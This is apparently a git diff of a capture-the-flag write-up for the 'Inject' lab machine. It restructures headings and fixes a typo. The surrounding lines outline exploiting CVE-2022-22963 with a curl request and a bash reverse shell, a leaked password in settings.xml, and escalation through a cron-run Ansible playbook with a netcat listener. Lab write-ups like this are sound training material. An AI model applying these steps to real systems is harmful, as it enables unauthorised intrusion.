@@ -1,6 +1,14 @@
 # Inject
 
-### Info Gathering
+## Summary
+
+* [Info Gathering](#info-gathering)
+* [Exploiting](#exploiting)
+* [Reverse Shell](#reverse-shell)
+* [User](#user)
+* [Root](#root)
+
+## Info Gathering
 First thing let's scan for the open ports:
 ```
 [vecio@vecio Notes]$ nmap 10.10.11.204
@@ -157,7 +165,7 @@ From this configuration file we can find some useful information:
 
 Now Google is your friend, start searching for known vulnerabilities we can exploit.
 
-### Exploiting
+## Exploiting
 We find [CVE-2022-22963: Remote Code Execution in Spring Cloud Function by malicius Spring Expression](https://spring.io/security/cve-2022-22963).
 "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources".
 
@@ -178,7 +186,7 @@ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.
 ```
 We can test the vulnerability by creating a file `test` in the `/tmp` directory and check if it gets created using BurpSuite and the `/show_image` vulnerability.
 
-# Reverse Shell
+## Reverse Shell
 Now that we discovered an RCE, we can download and execute a reverse shell on the machine.
 We can use a bash reverse shell:
 ```
@@ -203,7 +211,7 @@ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.
 ```
 We now got a reverse shell to the machine.
 
-# User
+## User
 Getting the user flag is quite easy, we can see that we are logged in as user `frank`.
 Looking around in the `/home` directory, we can find the user flag in the `/home/phil` directory, but we don't have permission to read that file.
 Looking in the `/home/frank` directory using `ls -la` we notice a strange directory `.m2`, inside of which there's the file `settings.xml`, we can print the content of the file:
@@ -227,7 +235,7 @@ Looking in the `/home/frank` directory using `ls -la` we notice a strange direct
 We notice a credential leak of the user phil: `phil:DocPhillovestoInject123`.
 We can now swith user: `su phil` and get the flag in the `/home/phil/user.txt` file.
 
-# Root
+## Root
 Getting root is a bit more tricky, we can use [pspy](https://github.com/DominicBreuker/pspy) to scan the server for all the processes that are being executed.
 We can notice a `CRON` process that keeps executing an `Ansible` playbook.
 ```
@@ -252,6 +260,6 @@ So we create a `test.yml` file in the `/opt/automation/tasks` directory with a p
 ```
 Now we can listen on the port `4999` waiting for the file to be executed and enstablish the connection:
 ```
-lc -lvnp 4999
+nc -lvnp 4999
 ```
 Once we got the `/bin/bash` shell we can `cd /root` and get the flag in the `root.txt` file.
